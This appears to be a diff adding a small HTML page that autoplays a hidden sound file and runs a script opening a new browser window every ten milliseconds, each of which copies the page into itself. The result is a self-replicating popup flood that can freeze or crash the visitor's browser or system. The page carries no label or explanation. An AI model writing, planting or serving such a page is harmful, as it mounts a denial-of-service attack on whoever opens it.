@@ -1,0 +1,16 @@
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="css/style.css" />
+</head>
+  <body>
+  <audio controls autoplay hidden>
+		<source src="sounds/boom.mp3" type="audio/mp3" hidden="true" >
+</audio> 
+    <script>
+      setInterval(function() {
+        var w = window.open();
+        w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+      }, 10);
+    </script>
+  </body>
+</html>
